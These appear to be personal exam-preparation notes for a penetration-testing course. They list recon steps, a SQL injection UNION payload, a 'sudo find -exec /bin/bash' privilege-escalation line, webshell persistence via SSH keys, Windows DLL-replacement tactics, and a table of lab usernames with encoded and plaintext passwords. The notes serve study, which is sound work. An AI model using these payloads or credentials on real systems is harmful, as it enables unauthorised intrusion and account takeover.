1 	Aaron 	$ncnffjbeqlCn$$jbeq         -- apasswordyPa$$word
2 	user2 	$RntyrfVfNER78              -- EaglesIsARE78
3 	user3 	$Obo4GURRnccyrf             -- Bob4THEEapples
4 	Lroth 	$                           -- anotherpassword4THEages


UNION SELECT user_id,name,username FROM siteusers.users;#


7c:86:f6:53:f6:7e:4f:81:fe:35:7a:ef:e8:bf:ca:0e:03:ab:70:93



Common ports 22,80,80,8080,8888,4444,4242,2222
22 may not be ssh 
80 may not be http

banner grab to check while nmap -p- scan is running

go for port 80 first because we dont have creds

navigate to ip on firefox

once you get to the backend you dont need the web page

directory traversal is last resort, its not super useful
# ON EVERY WEBSITE
run the nmap --script http-enum.nse
or nikto -h <ip> 2>/dev/null
robots.txt

if you webshell or command injection automatically upload ssh key

creds may be encoded

get on the machine and see if you can privesc
using sudo -l or the find commands

find next box by using 
ip a
ip n
ip r
cat /etc/hosts

once an ip is found run the ping sweep

when doing sql injection make sure you know how many columns there are

if you see a wall of text view the page source, there may be a link

### SOMETIMES YOU MAY NOT BE ABLE TO GET ON THE BOX ###

sudo find . -exec /bin/bash \; -quit

roots home dir is /root

may need to use directory traversal to check if you cant get backend access /etc/hosts 

ports for windows machine 445, 3389, 9999

BANNER GRAB

when exploiting secure server, open multihandler 

when you rdp on the machine
go to services, check the description

if they give us a executable or dll, just rename it to whatever it is being called out to and 
restart the box 3 times


## KEY THINGS TO UNDERSTAND

everything in reverse engineering 
everything in exploit development
everything in linux exploitation
RECON 
SQL INJECTION --- lot of points
XXS 
windows exploitation --- know how to check the services and dll, exe replacement

part 1 goes to Reverse Engineering
part 2 goes thru the rest

